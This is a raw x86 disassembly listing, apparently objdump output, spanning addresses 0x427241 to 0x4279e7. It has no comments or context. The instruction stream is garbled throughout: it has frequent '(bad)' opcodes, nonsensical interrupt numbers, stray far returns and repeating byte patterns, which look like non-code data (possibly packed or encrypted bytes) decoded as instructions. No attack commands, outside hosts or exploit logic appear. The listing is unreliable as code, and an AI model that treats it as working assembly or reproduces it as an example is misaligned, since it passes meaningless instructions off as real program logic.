  427241:	cmp    ebx,ecx
  427243:	shr    ebx,cl
  427245:	xchg   edx,eax
  427246:	shr    edx,cl
  427248:	sub    BYTE PTR [ebx+0x13],dl
  42724b:	retf   0x4d8c
  42724e:	push   ebp
  42724f:	pusha  
  427250:	jge    0x427281
  427252:	push   es
  427253:	mov    esp,0xcd808081
  427258:	jbe    0x42726e
  42725a:	int    0x8d
  42725c:	adc    al,0xcd
  42725e:	mov    ebp,ecx
  427260:	cmp    BYTE PTR [ebx],0xf0
  427263:	shl    edx,cl
  427265:	sub    BYTE PTR [ebx],bh
  427267:	jns    0x42723c
  427269:	mov    ebp,0xcad35392
  42726e:	je     0x4271f5
  427270:	ror    ch,1
  427272:	lea    edx,[ecx]
  427274:	int    0x89
  427276:	int    0x96
  427278:	adc    ebp,ecx
  42727a:	and    bh,BYTE PTR [ebx]
  42727c:	psrlq  mm5,mm3
  42727f:	xchg   edx,eax
  427280:	cmp    ebx,ecx
  427282:	shr    edx,cl
  427284:	sub    BYTE PTR [ebx+0x13],dl
  427287:	retf   0x4d8c
  42728a:	rol    BYTE PTR [edx-0x2d],1
  42728d:	int    0x8d
  42728f:	in     eax,dx
  427290:	int    0x89
  427292:	int    0x96
  427294:	in     eax,dx
  427295:	int    0x22
  427297:	cmp    ecx,DWORD PTR [edi]
  427299:	shr    ebx,cl
  42729b:	xchg   edx,eax
  42729c:	cmp    ebx,ecx
  42729e:	shr    edx,cl
  4272a0:	sub    BYTE PTR [ebx+0x13],dl
  4272a3:	retf   0x4d8c
  4272a6:	ror    BYTE PTR [edx-0x2d],1
  4272a9:	int    0x8d
  4272ab:	adc    ebp,ecx
  4272ad:	mov    ebp,ecx
  4272af:	xchg   esi,eax
  4272b0:	adc    ebp,ecx
  4272b2:	and    bh,BYTE PTR [ebx]
  4272b4:	(bad)  
  4272b6:	(bad)  
  4272b8:	jmp    0x42724c
  4272ba:	shr    edx,cl
  4272bc:	sub    BYTE PTR [ebx+0x13],dl
  4272bf:	retf   0x4d8c
  4272c2:	push   ebp
  4272c3:	pusha  
  4272c4:	jge    0x4272f5
  4272c6:	push   es
  4272c7:	cmc    
  4272c8:	add    BYTE PTR [eax-0x12893280],0xcd
  4272cf:	(bad)  
  4272d0:	in     eax,dx
  4272d1:	int    0x89
  4272d3:	int    0x80
  4272d5:	cmp    esi,eax
  4272d7:	shl    edx,cl
  4272d9:	sub    BYTE PTR [ebx],bh
  4272db:	jns    0x4272b0
  4272dd:	mov    ebp,0xcad35392
  4272e2:	je     0x427269
  4272e4:	ror    ch,1
  4272e6:	lea    edx,[ecx*8+0x1496cd89]
  4272ed:	int    0x22
  4272ef:	cmp    ecx,DWORD PTR [edi]
  4272f1:	shr    ebx,cl
  4272f3:	xchg   edx,eax
  4272f4:	cmp    ebx,ecx
  4272f6:	shr    edx,cl
  4272f8:	sub    BYTE PTR [ebx+0x13],dl
  4272fb:	retf   0x4d8c
  4272fe:	rol    BYTE PTR [edx-0x2d],1
  427301:	int    0x8d
  427303:	cmc    
  427304:	int    0x89
  427306:	int    0x96
  427308:	cmc    
  427309:	int    0x22
  42730b:	cmp    ecx,DWORD PTR [edi]
  42730d:	shr    ebx,cl
  42730f:	xchg   edx,eax
  427310:	cmp    ebx,ecx
  427312:	shr    edx,cl
  427314:	sub    BYTE PTR [ebx+0x13],dl
  427317:	retf   0x4d8c
  42731a:	ror    BYTE PTR [edx-0x2d],1
  42731d:	int    0x8d
  42731f:	adc    al,0xcd
  427321:	mov    ebp,ecx
  427323:	xchg   esi,eax
  427324:	adc    al,0xcd
  427326:	and    bh,BYTE PTR [ebx]
  427328:	(bad)  
  42732a:	(bad)  
  42732c:	jmp    0x4272c0
  42732e:	shr    edx,cl
  427330:	sub    BYTE PTR [ebx+0x13],dl
  427333:	retf   0x4d8c
  427336:	push   ebp
  427337:	pusha  
  427338:	jge    0x427369
  42733a:	push   es
  42733b:	add    DWORD PTR [eax+0x76cd8080],eax
  427341:	in     eax,dx
  427342:	int    0x8d
  427344:	in     eax,dx
  427345:	int    0x89
  427347:	int    0x80
  427349:	cmp    esi,eax
  42734b:	shl    edx,cl
  42734d:	sub    BYTE PTR [ebx],bh
  42734f:	jns    0x427324
  427351:	mov    ebp,0xcad35392
  427356:	je     0x4272dd
  427358:	ror    ch,1
  42735a:	(bad)  
  42735b:	cmc    
  42735c:	int    0x89
  42735e:	int    0x96
  427360:	cmc    
  427361:	int    0x22
  427363:	cmp    ecx,DWORD PTR [edi]
  427365:	shr    ebx,cl
  427367:	xchg   edx,eax
  427368:	cmp    ebx,ecx
  42736a:	shr    edx,cl
  42736c:	sub    BYTE PTR [ebx+0x13],dl
  42736f:	retf   0x4d8c
  427372:	rol    BYTE PTR [edx-0x2d],1
  427375:	int    0x8d
  427377:	adc    ebp,ecx
  427379:	mov    ebp,ecx
  42737b:	xchg   esi,eax
  42737c:	adc    ebp,ecx
  42737e:	and    bh,BYTE PTR [ebx]
  427380:	psrlq  mm5,mm3
  427383:	xchg   edx,eax
  427384:	cmp    ebx,ecx
  427386:	shr    edx,cl
  427388:	sub    BYTE PTR [ebx+0x13],dl
  42738b:	retf   0x4d8c
  42738e:	ror    BYTE PTR [edx-0x2d],1
  427391:	int    0x8d
  427393:	in     eax,dx
  427394:	int    0x89
  427396:	int    0x96
  427398:	in     eax,dx
  427399:	int    0x22
  42739b:	cmp    ecx,DWORD PTR [edi]
  42739d:	cmp    ebx,ecx
  42739f:	shr    ebx,cl
  4273a1:	xchg   edx,eax
  4273a2:	shr    edx,cl
  4273a4:	sub    BYTE PTR [ebx+0x13],dl
  4273a7:	retf   0x4d8c
  4273aa:	push   ebp
  4273ab:	pusha  
  4273ac:	jge    0x427384
  4273ae:	xor    bh,cl
  4273b0:	jbe    0x427382
  4273b2:	jo     0x427371
  4273b4:	outs   dx,DWORD PTR ds:[esi]
  4273b5:	lods   eax,DWORD PTR ds:[esi]
  4273b6:	add    BYTE PTR [eax],al
  4273b8:	int    0x8d
  4273ba:	pop    ebp
  4273bb:	inc    ebx
  4273bc:	rcl    esp,cl
  4273be:	push   ss
  4273bf:	int    0x76
  4273c1:	std    
  4273c2:	int    0x8d
  4273c4:	std    
  4273c5:	cmp    esi,eax
  4273c7:	cmp    edi,DWORD PTR [ecx-0x2d]
  4273ca:	repnz sub bl,dl
  4273cd:	mov    ebp,0xad35392
  4273d2:	jbe    0x427381
  4273d4:	int    0x76
  4273d6:	stc    
  4273d7:	int    0xa6
  4273d9:	stc    
  4273da:	int    0x76
  4273dc:	stc    
  4273dd:	int    0x8d
  4273df:	stc    
  4273e0:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4273e6:	xchg   edx,eax
  4273e7:	shr    DWORD PTR [ebp-0x7862acd8],cl
  4273ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273ee:	gs int 0x76
  4273f1:	xchg   ebp,eax
  4273f2:	cmp    ecx,DWORD PTR [edi]
  4273f4:	add    al,0xf2
  4273f6:	std    
  4273f7:	add    al,0xad
  4273f9:	std    
  4273fa:	shr    esp,cl
  4273fc:	sub    BYTE PTR [edi+0x12db537d],al
  427402:	hlt    
  427403:	dec    ecx
  427404:	and    DWORD PTR [esi-0x28932cb],eax
  42740a:	int    0x8d
  42740c:	std    
  42740d:	cmp    esi,eax
  42740f:	cmp    edi,DWORD PTR [ecx-0x2d]
  427412:	repnz sub bl,dl
  427415:	mov    ebp,0xcdd35392
  42741a:	lea    ebp,[ebp+0x52f7d43]
  427420:	push   ds
  427421:	std    
  427422:	add    BYTE PTR [eax],al
  427424:	int    0x76
  427426:	std    
  427427:	int    0x8d
  427429:	std    
  42742a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42742d:	lock shl edx,cl
  427430:	sub    bl,dl
  427432:	mov    ebp,0xcdd35392
  427437:	lea    ebp,[ebp+0x1ad67d43]
  42743d:	int    0x76
  42743f:	stc    
  427440:	int    0x8d
  427442:	stc    
  427443:	cmp    edi,DWORD PTR [ecx+0x3b]
  427446:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42744d:	push   ebx
  42744e:	shr    ebx,cl
  427450:	jle    0x4273d3
  427452:	add    BYTE PTR [eax+0x5b6324c0],0x0
  427459:	(bad)  
  42745a:	popf   
  42745b:	iret   
  42745c:	jbe    0x427473
  42745e:	jo     0x42741d
  427460:	jge    0x42743d
  427462:	add    BYTE PTR [eax],al
  427464:	int    0x76
  427466:	std    
  427467:	int    0x8d
  427469:	std    
  42746a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42746d:	lock shl edx,cl
  427470:	sub    bl,dl
  427472:	mov    ebp,0xcdd35392
  427477:	lea    esp,[ebp+0x5bd4d343]
  42747d:	int    0x76
  42747f:	stc    
  427480:	int    0x8d
  427482:	stc    
  427483:	cmp    edi,DWORD PTR [ecx+0x3b]
  427486:	lock shl edx,cl
  427489:	sub    bl,dl
  42748b:	mov    ebp,0xcdd35392
  427490:	lea    esp,[ebp+0x26d4d343]
  427496:	int    0x76
  427498:	stc    
  427499:	int    0x8d
  42749b:	stc    
  42749c:	cmp    edi,DWORD PTR [ecx+0x3b]
  42749f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4274a6:	push   ebx
  4274a7:	shl    DWORD PTR [eax+0x5b],cl
  4274aa:	iret   
  4274ab:	jbe    0x4274c2
  4274ad:	jo     0x42746c
  4274af:	das    
  4274b0:	cli    
  4274b1:	add    BYTE PTR [eax],al
  4274b3:	int    0x76
  4274b5:	std    
  4274b6:	int    0x8d
  4274b8:	std    
  4274b9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274bc:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4274c3:	push   ebx
  4274c4:	shl    DWORD PTR [eax+0x5b],cl
  4274c7:	iret   
  4274c8:	jbe    0x4274df
  4274ca:	jo     0x427489
  4274cc:	sti    
  4274cd:	stc    
  4274ce:	add    BYTE PTR [eax],al
  4274d0:	int    0x76
  4274d2:	popf   
  4274d3:	xchg   ebp,eax
  4274d5:	or     dh,BYTE PTR [esi+0x14]
  4274d8:	add    dh,dl
  4274da:	cmp    eax,0xcd14d600
  4274df:	jbe    0x427516
  4274e1:	xchg   DWORD PTR [esi-0x78],esi
  4274e4:	jo     0x4274a3
  4274e6:	push   edx
  4274e7:	fild   DWORD PTR [eax]
  4274e9:	add    ch,cl
  4274eb:	jbe    0x4274ea
  4274ed:	int    0x8d
  4274ef:	std    
  4274f0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274f3:	lock shl edx,cl
  4274f6:	sub    bl,dl
  4274f8:	mov    ebp,0xcdd35392
  4274fd:	lea    esp,[ebp-0x592b2cbd]
  427503:	int    0x76
  427505:	stc    
  427506:	int    0x8d
  427508:	stc    
  427509:	cmp    edi,DWORD PTR [ecx+0x3b]
  42750c:	lock shl edx,cl
  42750f:	sub    bl,dl
  427511:	mov    ebp,0xcdd35392
  427516:	lea    esp,[ebp+0x32d4d343]
  42751c:	int    0x76
  42751e:	stc    
  42751f:	int    0x8d
  427521:	stc    
  427522:	cmp    edi,DWORD PTR [ecx-0x2d]
  427525:	mov    ebp,0xd3f03b92
  42752a:	repnz sub BYTE PTR [ebx-0x2d],dl
  42752e:	jo     0x427530
  427530:	(bad)  
  427531:	cmp    eax,0x873576cd
  427536:	jbe    0x4274c0
  427538:	jo     0x4274f7
  42753a:	add    eax,0xcd0000f9
  42753f:	jbe    0x42753e
  427541:	int    0x8d
  427543:	std    
  427544:	cmp    edi,DWORD PTR [ecx-0x2d]
  427547:	mov    ebp,0xd3f03b92
  42754c:	repnz sub BYTE PTR [ebx-0x2d],dl
  427550:	jo     0x427552
  427552:	(bad)  
  427553:	cmp    eax,0x873576cd
  427558:	jbe    0x4274e2
  42755a:	jo     0x427519
  42755c:	jb     0x427557
  42755e:	add    BYTE PTR [eax],al
  427560:	int    0x8d
  427562:	inc    ebp
  427563:	int    0x76
  427565:	inc    ebp
  427566:	cmp    ecx,ecx
  427568:	cmp    ecx,DWORD PTR [edi]
  42756a:	shr    ebx,cl
  42756c:	xchg   edx,eax
  42756d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  427573:	lea    ebp,ds:0x803fd33b
  427579:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427583:	jo     0x427585
  427585:	(bad)  
  427586:	cmp    eax,0x87358dcd
  42758b:	lea    ecx,[eax+0xa95abd]
  427591:	add    ch,cl
  427593:	jbe    0x4275c5
  427595:	int    0x8d
  427597:	cmp    eax,0x76cd8881
  42759c:	cmp    eax,0xabd7687
  4275a1:	jbe    0x427560
  4275a3:	int    0x76
  4275a5:	stc    
  4275a6:	int    0x8d
  4275a8:	stc    
  4275a9:	cmp    esi,eax
  4275ab:	shl    edx,cl
  4275ad:	sub    BYTE PTR [ebx],bh
  4275af:	jns    0x427584
  4275b1:	mov    ebp,0xcdd35392
  4275b6:	lea    edi,[ebp-0x322c2ed1]
  4275bc:	(bad)  
  4275bd:	std    
  4275be:	int    0x96
  4275c0:	std    
  4275c1:	cmp    ecx,DWORD PTR [edi]
  4275c3:	cmp    ebx,ecx
  4275c5:	shr    ebx,cl
  4275c7:	xchg   edx,eax
  4275c8:	shr    edx,cl
  4275ca:	sub    BYTE PTR [ebx+0x13],dl
  4275cd:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  4275d3:	or     edi,DWORD PTR [ecx]
  4275d5:	cli    
  4275d6:	add    BYTE PTR [eax],al
  4275d8:	int    0x76
  4275da:	mov    BYTE PTR [edx-0x2d349c58],ch
  4275e0:	xor    BYTE PTR [eax+0x4edcd96],al
  4275e6:	in     eax,dx
  4275e7:	adc    al,0x5b
  4275e9:	cwde   
  4275ea:	call   0xcd34:0x76cd6d3b
  4275f1:	add    DWORD PTR ds:0xcd808081,ebp
  4275f7:	xchg   esi,eax
  4275f8:	mov    ch,cl
  4275fa:	or     ch,0xd6
  4275fd:	dec    esp
  4275fe:	int    0xe6
  427600:	mov    ch,cl
  427602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427603:	dec    esp
  427604:	or     dh,BYTE PTR [esi-0x3]
  427607:	pop    edi
  427608:	jnp    0x427641
  42760a:	ficom  WORD PTR [ebx]
  42760c:	cmp    esp,ebx
  42760e:	pop    ebp
  42760f:	mov    ebp,0x3b25230a
  427614:	adc    DWORD PTR [edi],ebp
  427616:	inc    ebp
  427617:	sti    
  427618:	xchg   edx,eax
  427619:	shr    ecx,cl
  42761b:	sub    BYTE PTR [edx],dl
  42761d:	clc    
  42761e:	add    BYTE PTR [eax-0x102c9380],0x92
  427625:	cmp    ebx,ebp
  427627:	push   ebx
  427628:	clc    
  427629:	int    0xe6
  42762b:	sbb    al,0x53
  42762d:	aad    0x43
  42762f:	(bad)  
  427631:	sbb    eax,DWORD PTR [ebx-0xc]
  427634:	(bad)  
  427635:	das    
  427636:	adc    cl,BYTE PTR [ebp+0x59]
  427639:	je     0x4275e5
  42763b:	push   edi
  42763c:	ja     0x427603
  42763e:	xchg   edi,eax
  42763f:	shr    ebx,0xd9
  427642:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  42764c:	xchg   esi,eax
  42764d:	mov    ch,cl
  42764f:	(bad)  
  427650:	dec    esp
  427651:	int    0x96
  427653:	mov    ch,cl
  427655:	(bad)  
  427656:	dec    esp
  427657:	int    0xe6
  427659:	mov    ch,cl
  42765b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42765c:	dec    esp
  42765d:	cmp    edx,DWORD PTR [ecx]
  42765f:	cmp    esp,ebx
  427661:	das    
  427662:	inc    ebp
  427663:	sti    
  427664:	xchg   edx,eax
  427665:	shr    ecx,cl
  427667:	sub    BYTE PTR [edx],dl
  427669:	clc    
  42766a:	add    BYTE PTR [eax-0x22c49380],0x53
  427671:	aad    0xd3
  427673:	out    dx,eax
  427674:	xchg   edx,eax
  427675:	push   ebx
  427676:	clc    
  427677:	int    0xe6
  427679:	xor    ch,cl
  42767b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42767c:	adc    al,0x3b
  42767e:	popf   
  42767f:	int    0x76
  427681:	xor    BYTE PTR [ebx],bh
  427683:	cli    
  427684:	int    0x8d
  427686:	adc    al,0x2f
  427688:	inc    ebp
  427689:	loope  0x42761d
  42768b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  427691:	cli    
  427692:	push   esi
  427693:	add    BYTE PTR [eax-0x132c9380],0x92
  42769a:	push   ebx
  42769b:	popf   
  42769c:	int    0x76
  42769e:	mov    BYTE PTR [edi-0x320be427],al
  4276a4:	bswap  ebp
  4276a6:	(bad)  
  4276a7:	dec    esp
  4276a8:	int    0xe6
  4276aa:	xor    ch,cl
  4276ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276ad:	adc    al,0x4
  4276af:	lods   eax,DWORD PTR ds:[esi]
  4276b0:	std    
  4276b1:	add    al,0xe9
  4276b3:	std    
  4276b4:	shr    ebx,cl
  4276b6:	sub    BYTE PTR [ebx],bh
  4276b8:	ficom  DWORD PTR [esi-0x2c]
  4276bb:	aaa    
  4276bc:	ficom  WORD PTR [ebx]
  4276be:	adc    dh,bh
  4276c0:	mov    ebp,0x1225230a
  4276c5:	clc    
  4276c6:	aam    0x37
  4276c8:	ficom  WORD PTR [ebx]
  4276ca:	adc    dh,ah
  4276cc:	mov    ebp,0x8725230a
  4276d1:	leave  
  4276d2:	sbb    esi,esp
  4276d4:	push   ebx
  4276d5:	jge    0x42772a
  4276d7:	cdq    
  4276d8:	pop    ebp
  4276d9:	mov    ebp,0x1225230a
  4276de:	add    dl,dh
  4276e0:	aaa    
  4276e1:	ficom  WORD PTR [ebx]
  4276e3:	cmp    esi,ecx
  4276e5:	adc    bh,dl
  4276e7:	out    0x37,al
  4276e9:	ficom  WORD PTR [ebx]
  4276eb:	(bad)  
  4276ec:	sbb    eax,DWORD PTR [ebx-0xf]
  4276ef:	(bad)  
  4276f0:	das    
  4276f1:	adc    dl,BYTE PTR [esi-0x1]
  4276f4:	das    
  4276f5:	stos   DWORD PTR es:[edi],eax
  4276f6:	push   es
  4276f7:	in     eax,0x9b
  4276f9:	xchg   edi,eax
  4276fa:	imul   bl
  4276fc:	and    al,0x81
  4276fe:	add    BYTE PTR [eax-0x32776933],0xd6
  427705:	dec    esp
  427706:	int    0xa6
  427708:	mov    ch,cl
  42770a:	out    0x4c,al
  42770c:	cmp    edx,DWORD PTR [ecx]
  42770e:	pop    edi
  42770f:	jnp    0x427748
  427711:	ficom  WORD PTR [ebx]
  427713:	cmp    esp,ebx
  427715:	das    
  427716:	inc    ebp
  427717:	sti    
  427718:	xchg   edx,eax
  427719:	shr    edi,cl
  42771b:	xchg   edx,eax
  42771c:	cmp    eax,DWORD PTR [eax]
  42771e:	shl    ebp,cl
  427720:	sub    BYTE PTR [edx],cl
  427722:	(bad)  
  427723:	cmc    
  427724:	push   ebx
  427725:	fxch   st(5)
  427727:	out    0xf5,al
  427729:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  427733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427734:	and    al,0xcd
  427736:	and    ecx,DWORD PTR [edx]
  427738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427739:	adc    DWORD PTR [ebx-0x1e],eax
  42773c:	(bad)  
  42773d:	xchg   BYTE PTR [ebx],bh
  42773f:	fiadd  DWORD PTR [ebx-0x27]
  427742:	aam    0x20
  427744:	add    dh,dl
  427746:	xor    al,0xcd
  427748:	(bad)  
  427749:	and    al,0x0
  42774b:	(bad)  
  42774c:	sub    al,0x0
  42774e:	(bad)  
  42774f:	std    
  427750:	add    BYTE PTR [eax-0x43],bl
  427753:	sub    edi,eax
  427755:	add    BYTE PTR [eax],al
  427757:	or     al,BYTE PTR [esi-0x7f7f9615]
  42775d:	or     ch,0x96
  427760:	mov    ch,cl
  427762:	out    0x4c,al
  427764:	cmp    edi,ecx
  427766:	cmp    esp,ebx
  427768:	das    
  427769:	inc    ebp
  42776a:	add    edx,DWORD PTR [edx+0xa9210d3]
  427770:	out    0xf5,al
  427772:	int    0xe6
  427774:	mov    ch,cl
  427776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427777:	dec    esp
  427778:	shr    ecx,cl
  42777a:	sub    BYTE PTR [ebx],bh
  42777c:	dec    ebp
  42777e:	(bad)  
  42777f:	cmc    
  427780:	cmp    ebx,ebp
  427782:	push   ebx
  427783:	clc    
  427784:	int    0xe6
  427786:	xor    BYTE PTR [ebx],bh
  427788:	cli    
  427789:	push   ebx
  42778a:	aad    0xcd
  42778c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42778d:	adc    al,0x3b
  42778f:	popf   
  427790:	int    0xc9
  427792:	int    0xe6
  427794:	xor    ch,cl
  427796:	or     al,0xcd
  427798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427799:	adc    al,0x2f
  42779b:	inc    ebp
  42779c:	jge    0x427730
  42779e:	shr    ecx,cl
  4277a0:	sub    BYTE PTR [ebx],bh
  4277a2:	fst    st(3)
  4277a4:	jmp    0x427738
  4277a6:	adc    bh,al
  4277a8:	add    BYTE PTR [eax-0x3aac9380],0x53
  4277af:	lock inc ebx
  4277b1:	icebp  
  4277b2:	(bad)  
  4277b3:	sbb    BYTE PTR [ebx+0x2],al
  4277b6:	(bad)  
  4277b7:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  4277bd:	mov    esi,0xdd8bf56d
  4277c2:	(bad)  
  4277c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277c4:	cmp    edi,esp
  4277c6:	sbb    eax,0xcd62ec76
  4277cb:	jbe    0x427755
  4277cd:	int    0x8d
  4277cf:	dec    esp
  4277d0:	int    0x96
  4277d2:	mov    ch,cl
  4277d4:	(bad)  
  4277d5:	dec    esp
  4277d6:	adc    al,BYTE PTR [edx]
  4277d8:	mov    ebp,0x5625230a
  4277dd:	jnp    0x427816
  4277df:	ficom  WORD PTR [ebx]
  4277e1:	das    
  4277e2:	inc    ebp
  4277e3:	jge    0x427777
  4277e5:	int    0xfb
  4277e7:	cmp    eax,DWORD PTR [eax]
  4277e9:	cmp    ebx,edx
  4277eb:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  4277f1:	jmp    0x427785
  4277f3:	adc    dh,bh
  4277f5:	add    BYTE PTR [eax-0x36ac9380],0x53
  4277fc:	divps  xmm6,XMMWORD PTR [esi-0x3]
  427800:	(bad)  
  427801:	test   BYTE PTR [ebx-0x1d],al
  427804:	aam    0x4c
  427806:	adc    al,BYTE PTR [esi-0x3e]
  427809:	gs sub al,0x1
  42780c:	jo     0x427848
  42780e:	mov    edx,0x124aece0
  427813:	ss inc edx
  427815:	das    
  427816:	sbb    edx,esi
  427818:	mov    ebx,0xaa029f75
  42781d:	test   al,0x63
  42781f:	retf   
  427820:	shr    BYTE PTR [eax+eax*4],cl
  427823:	xchg   esi,eax
  427824:	int    0xed
  427826:	add    al,0xed
  427828:	dec    esp
  427829:	int    0x76
  42782b:	mov    ch,cl
  42782d:	lea    ecx,[edi+ebp*1+0x45]
  427831:	jge    0x4277c5
  427833:	shr    ebx,cl
  427835:	xchg   edx,eax
  427836:	int    0x8d
  427838:	mov    ch,cl
  42783a:	xchg   esi,eax
  42783b:	dec    esp
  42783c:	cwde   
  42783d:	shl    edx,cl
  42783f:	sub    ch,cl
  427841:	lea    ebx,[ecx+ebp*2]
  427844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427845:	mov    esi,0x793b4229
  42784a:	cmp    ebx,edx
  42784c:	push   ebx
  42784d:	ror    BYTE PTR [edx],cl
  42784f:	or     ebp,0x1cd2476
  427855:	xor    eax,0xcd808081
  42785a:	mov    ch,cl
  42785c:	jbe    0x427882
  42785e:	int    0x1
  427860:	xor    eax,0xcd808081
  427865:	add    BYTE PTR [edi-0x72329b92],0x24
  42786c:	int    0xa
  42786e:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  427874:	adc    al,0xc0
  427876:	test   BYTE PTR [eax+eax*4+0x808050],bh
  42787d:	nop
  42787e:	jo     0x4278e2
  427880:	add    bl,ah
  427882:	or     cl,BYTE PTR [ebx-0x32778933]
  427888:	lea    ecx,[edi+ebp*1+0x45]
  42788c:	jge    0x427820
  42788e:	shr    ebx,cl
  427890:	xchg   edx,eax
  427891:	int    0x8d
  427893:	mov    ch,cl
  427895:	xchg   esi,eax
  427896:	dec    esp
  427897:	add    dh,dl
  427899:	and    al,0x3b
  42789b:	jns    0x4278d8
  42789d:	ficom  DWORD PTR [ebx-0x2e]
  4278a0:	or     dh,BYTE PTR [esi-0x3]
  4278a3:	iret   
  4278a4:	jbe    0x4278a3
  4278a6:	jo     0x427842
  4278a8:	add    dh,dl
  4278aa:	sbb    al,0xd3
  4278ac:	repnz sub BYTE PTR [eax],al
  4278af:	(bad)  
  4278b0:	adc    al,0x0
  4278b2:	(bad)  
  4278b3:	xor    BYTE PTR [eax],al
  4278b5:	(bad)  
  4278b6:	dec    esp
  4278b7:	add    dh,dl
  4278b9:	mov    BYTE PTR [ebp+0xfe2b],bh
  4278bf:	int    0x76
  4278c1:	mov    ch,cl
  4278c3:	lea    ecx,[edi+ebp*1+0x45]
  4278c7:	jge    0x42785b
  4278c9:	shr    ebx,cl
  4278cb:	xchg   edx,eax
  4278cc:	int    0x8d
  4278ce:	mov    ch,cl
  4278d0:	xchg   esi,eax
  4278d1:	dec    esp
  4278d2:	cmp    edi,DWORD PTR [ecx+0x3b]
  4278d5:	fcmovbe st,st(3)
  4278d7:	repnz sub ch,cl
  4278da:	das    
  4278db:	push   ebx
  4278dc:	rol    BYTE PTR [ebx+0x7d],cl
  4278df:	aam    0x36
  4278e1:	int    0x76
  4278e3:	xor    ch,cl
  4278e5:	lea    edx,[edi+ebp*1]
  4278e8:	inc    ebp
  4278e9:	jge    0x42787d
  4278eb:	shr    ebx,cl
  4278ed:	xchg   edx,eax
  4278ee:	int    0x8d
  4278f0:	xor    ch,cl
  4278f2:	xchg   esi,eax
  4278f3:	adc    al,0x3b
  4278f5:	jns    0x427932
  4278f7:	fcmovbe st,st(3)
  4278f9:	repnz sub ch,cl
  4278fc:	lea    ebx,[ebx+edx*2]
  4278ff:	shr    BYTE PTR [edi],cl
  427901:	shl    DWORD PTR [esi-0x3],1
  427904:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  42790a:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  427911:	call   0xcd3c:0xd6cd6d3b
  427918:	xchg   esi,eax
  427919:	inc    esp
  42791a:	int    0xe6
  42791c:	and    al,0x5d
  42791e:	mov    ebp,0x5f25230a
  427923:	jnp    0x42795c
  427925:	ficom  WORD PTR [ebx]
  427927:	inc    ebx
  427928:	icebp  
  427929:	das    
  42792a:	or     BYTE PTR [edi],al
  42792c:	add    BYTE PTR [eax-0x4613080],0x82
  427933:	test   BYTE PTR [ebx-0xc],al
  427936:	jnp    0x42791e
  427938:	inc    ebx
  427939:	hlt    
  42793a:	(bad)  
  42793b:	mov    BYTE PTR [ebx-0xf],al
  42793e:	das    
  42793f:	add    eax,0x80809216
  427944:	adc    bh,bh
  427946:	jno    0x42797f
  427948:	ficom  WORD PTR [ebx]
  42794a:	(bad)  
  42794b:	mov    BYTE PTR [ebx-0xf],al
  42794e:	das    
  42794f:	add    eax,0x80809285
  427954:	adc    bh,bh
  427956:	xchg   esi,eax
  427957:	aaa    
  427958:	ficom  WORD PTR [ebx]
  42795a:	(bad)  
  42795b:	mov    BYTE PTR [ebx-0xf],al
  42795e:	das    
  42795f:	add    eax,0x808080f8
  427964:	adc    bh,bh
  427966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427967:	aaa    
  427968:	ficom  WORD PTR [ebx]
  42796a:	(bad)  
  42796b:	test   BYTE PTR [ebx-0xf],al
  42796e:	aam    0x3e
  427970:	adc    bh,bh
  427972:	scas   al,BYTE PTR es:[edi]
  427973:	aaa    
  427974:	ficom  WORD PTR [ebx]
  427976:	(bad)  
  427977:	mov    BYTE PTR [ebx-0xf],al
  42797a:	das    
  42797b:	add    eax,0x808081db
  427980:	adc    bh,bh
  427982:	mov    dh,0x37
  427984:	ficom  WORD PTR [ebx]
  427986:	das    
  427987:	push   es
  427988:	into   
  427989:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  427993:	sub    bl,0x12
  427996:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  4279a0:	(bad)  
  4279a1:	adc    al,0x0
  4279a3:	(bad)  
  4279a4:	xor    BYTE PTR [eax],al
  4279a6:	(bad)  
  4279a7:	dec    esp
  4279a8:	add    dh,dl
  4279aa:	mov    BYTE PTR [ebp+0xff77],bh
  4279b0:	jmp    0x427968
  4279b2:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  4279bc:	mov    BYTE PTR [ebx-0xf],al
  4279bf:	das    
  4279c0:	add    eax,0x80808019
  4279c5:	adc    bh,bh
  4279c7:	xchg   ecx,eax
  4279c8:	aaa    
  4279c9:	ficom  WORD PTR [ebx]
  4279cb:	(bad)  
  4279cc:	mov    BYTE PTR [ebx-0xf],al
  4279cf:	das    
  4279d0:	add    eax,0x8080818e
  4279d5:	adc    bh,bh
  4279d7:	(bad)  
  4279d8:	aaa    
  4279d9:	ficom  WORD PTR [ebx]
  4279db:	(bad)  
  4279dc:	test   BYTE PTR [ebx-0xf],al
  4279df:	aam    0x1c
  4279e1:	adc    bh,bh
  4279e3:	fidiv  WORD PTR [edi]
  4279e5:	ficom  WORD PTR [ebx]
  4279e7:	(bad)  
